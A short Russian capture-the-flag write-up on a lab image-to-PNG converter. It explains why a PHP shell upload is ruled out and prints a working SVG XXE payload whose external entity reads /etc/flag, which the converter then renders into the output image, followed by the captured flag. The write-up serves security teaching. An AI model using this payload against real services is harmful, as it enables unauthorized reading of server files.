Неужели появился хороший сервис конвертации картинок в PNG? Нет.

url: [http://outdated:8003/](http://outdated:8003/)

Имеем сайт с функциональностью конвертации файлов в формат PNG. В глаза бросается форма загрузки файлов. Первой приходит мысль о загрузке php-шела, но т.к. мы не знаем пути загрузки файла, то этот вариант сразу отбрасывается (тем более, что бекенд написан не на php)

При попытке загрузки невалидного файла мы узнаем, какие форматы изображений можно загружать на сервер для конвертации: png, jpg, jpeg, bmp, svg, gif

SVG - это подвид XML. Мы можем попробовать эксплуатацию XXE для подгрузки локального файла следующим образом:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [
  <!ENTITY xxe SYSTEM "/etc/flag">
]>
<svg width="100%" height="100%" viewBox="0 0 300 100"
     xmlns="http://www.w3.org/2000/svg">
  <text x="20" y="35">&xxe;</text>
</svg>
```

Прежде чем провести конвертацию svg файла в png, конвертер подгрузит файл `/etc/flag`, он будет отрендерен в png файле

`flag{XXE_1N_SVG_1S_0LD_BUT_G0LD}`
